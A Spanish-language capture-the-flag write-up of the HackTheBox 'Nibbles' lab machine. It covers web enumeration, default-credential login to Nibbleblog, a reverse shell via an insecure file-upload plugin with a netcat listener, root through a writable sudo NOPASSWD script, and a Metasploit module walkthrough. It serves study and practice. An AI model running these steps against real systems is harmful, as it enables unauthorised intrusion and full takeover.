# Nibble: Web Footprint

# 🚩 Mission Report: Nibbles (HTB)

## 1. Reconocimiento y Enumeración (Enumeration)

Empezamos escaneando el objetivo para entender qué servicios corrían y dónde estaban los puntos débiles.

- **Discovery:** Encontramos un servidor web corriendo Apache.
- **Directory Busting:** Usamos `gobuster` y descubrimos el directorio `/nibbleblog/`.
- **Information Leakage:** Encontramos archivos XML sensibles expuestos:
    - `config.xml`: Reveló el email `admin@nibbles.com` (usuario potencial: **admin**).
    - `users.xml`: Confirmó que el usuario es `admin` y reveló una **Blacklist** de IPs (alerta de seguridad anti-bruteforce).

## 2. Acceso Inicial (Initial Access)

Con la información recolectada, procedimos a intentar loguearnos.

- **Credenciales:** Evitamos la fuerza bruta masiva (Hydra) para no ser bloqueados.
- **Técnica:** Password Guessing contextual.
- **Éxito:** Logramos entrar al panel de administración (`/nibbleblog/admin.php`) con:
    - User: `admin`
    - Pass: `nibbles`

## 3. Explotación (Exploitation - RCE)

Una vez dentro del panel de admin, buscamos una forma de ejecutar código en el servidor.

- **Vector de Ataque:** Plugin "My Image".
- **Vulnerabilidad:** File Upload inseguro (permite subir archivos PHP disfrazados o ignorando validaciones).
- **Payload:** Creamos un archivo PHP con una Reverse Shell apuntando a tu IP (`10.10.14.225`) y puerto `9443`.
- **Ejecución:**
    1. Subimos el archivo via web.
    2. Pusimos un listener: `nc -lvnp 9443`.
    3. Disparamos el exploit con `curl` hacia la ruta del plugin.

## 4. Post-Explotación y Estabilización

Conseguimos acceso, pero la shell era inestable ("dumb shell").

- **Shell Upgrade:** Usamos Python para generar una TTY completa y evitar cortes o falta de interactividad.Bash
    
    `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    
- **Reconocimiento Interno:**
    - Usuario actual: `nibbler` (verificado con `whoami`).
    - Ubicación actual: `/home/nibbler`.
    - **Loot (Botín):** Encontramos `user.txt` (User Flag) y `personal.zip` (posible vía a Root).

---

## 5. Escalada de Privilegios (Privilege Escalation)

Ya con acceso de usuario, el objetivo era convertirse en "Root" (Administrador total) para dominar la máquina por completo.

- **Enumeración Local:**
    - Encontramos un archivo sospechoso: `personal.zip` en el directorio `/home/nibbler`.
    - Acción: Descomprimimos el archivo (`unzip personal.zip`) y reveló una estructura de carpetas conteniendo un script: `/home/nibbler/personal/stuff/monitor.sh`.
- **Análisis de Vulnerabilidad (Sudo Rights):**
    - Ejecutamos `sudo -l` para ver si teníamos permisos especiales.
    - **El Hallazgo Crítico:** El sistema permitía al usuario `nibbler` ejecutar el script `monitor.sh` como **ROOT** sin necesidad de contraseña (`NOPASSWD`).
    - **El Fallo de Seguridad:** Aunque el script se ejecuta como Root, el archivo pertenecía a nuestro usuario (`nibbler`) y teníamos permisos de escritura. Esto nos permitió modificar su contenido.
- **Explotación (Script Poisoning):**
    - Técnica: Sobrescribimos el contenido legítimo del script con un comando para invocar una terminal de sistema.
    - Comando Inyectado:Bash
        
        `echo '#!/bin/bash' > monitor.sh
        echo '/bin/bash' >> monitor.sh
        chmod +x monitor.sh`
        
    - Explicación: Esto vacía el script y le dice "Cuando te ejecutes, simplemente abre una nueva terminal Bash".
- **Ejecución Final:**
    - Lanzamos el ataque aprovechando el permiso de sudo:Bash
        
        `sudo /home/nibbler/personal/stuff/monitor.sh`
        
    - Resultado: El prompt cambió de `$` a `#` y el usuario pasó a ser `root@Nibbles`. La inyección de la Reverse Shell adicional (con Netcat) no fue necesaria porque obtuvimos acceso directo en la misma terminal.

## 6. Misión Cumplida (Loot & Conclusion)

Con acceso total al sistema, procedimos a reclamar el trofeo final.

- **Validación:** Comando `whoami` devolvió `root`.
- **Root Flag:** Navegamos al directorio del administrador y leímos la bandera.Bash
    
    `cd /root
    cat root.txt`
    
- **Estado de la Máquina:** Pwned (Comprometida totalmente).

## ⚡ Extra: Método Alternativo con Metasploit (Automated RCE)

Aunque el método manual (cURL) es mejor para entender qué ocurre "bajo el capó", **Metasploit** tiene un módulo específico que automatiza la subida del archivo malicioso y la conexión de la reverse shell.

**Requisito previo:** Tener las credenciales `admin:nibbles`.

### 1. Iniciar y Buscar

Arrancamos la consola y buscamos exploits relacionados con "Nibbleblog".

Bash

`msfconsole
search nibbleblog`

*Output esperado:* Debería aparecer `exploit/multi/http/nibbleblog_file_upload`.

### 2. Selección y Configuración Básica

Seleccionamos el exploit y definimos quién ataca y quién es la víctima.

Bash

`# Seleccionar el módulo (usando el índice 0)
use 0

# Configurar la IP de la víctima (Target)
# REEMPLAZAR CON LA IP ACTUAL DE LA MÁQUINA
set RHOSTS 10.129.186.255

# Configurar tu IP de atacante (Listening Host)
# Tip: Puedes poner 'tun0' y Metasploit resolverá tu IP de VPN automáticamente
set LHOST tun0`

### 3. Configuración Específica (Credenciales y URI)

Este exploit necesita autenticarse para subir el archivo. También debemos decirle en qué carpeta está instalado el blog.

Bash

`# Credenciales descubiertas anteriormente
set USERNAME admin
set PASSWORD nibbles

# La ruta donde vive el blog (ej: http://ip/nibbleblog)
set TARGETURI nibbleblog`

### 4. Selección del Payload

Por defecto, Metasploit intenta usar `meterpreter` (su shell avanzada). Para este ejercicio, usaremos una **shell reversa básica** de Linux para replicar lo que hicimos manualmente.

Bash

`set PAYLOAD generic/shell_reverse_tcp`

### 5. Ejecución (Exploit)

Verificamos que todo esté en orden y disparamos.

Bash

`show options
exploit`

> Resultado: Si todo funciona, verás [*] Command shell session 1 opened.
Metasploit subirá automáticamente un archivo PHP aleatorio, lo ejecutará y luego lo borrará para limpiar sus huellas (Deleted image.php).
> 

### 6. Post-Explotación

Una vez dentro con esta shell:

1. Obtendrás acceso como `nibbler`.
2. Deberás repetir el proceso de **Escalada de Privilegios** manual (`monitor.sh`) para llegar a Root, ya que Metasploit solo te da el acceso inicial.

---

### 📝 Notas de Estudio (Key Takeaways)

- **Versatilidad:** Siempre es bueno saber hacer las cosas de dos formas (Manual vs Automática).
- **Limpieza:** Metasploit suele ser más "limpio" (borra los archivos que sube), mientras que manualmente a veces olvidamos borrar nuestros scripts de prueba.
- **Práctica:** Intenta enumerar la máquina nuevamente buscando otros vectores. Al ser una máquina antigua, es probable que el Kernel tenga vulnerabilidades ("Kernel Exploits") que permitan ser Root sin usar el truco de `monitor.sh`.
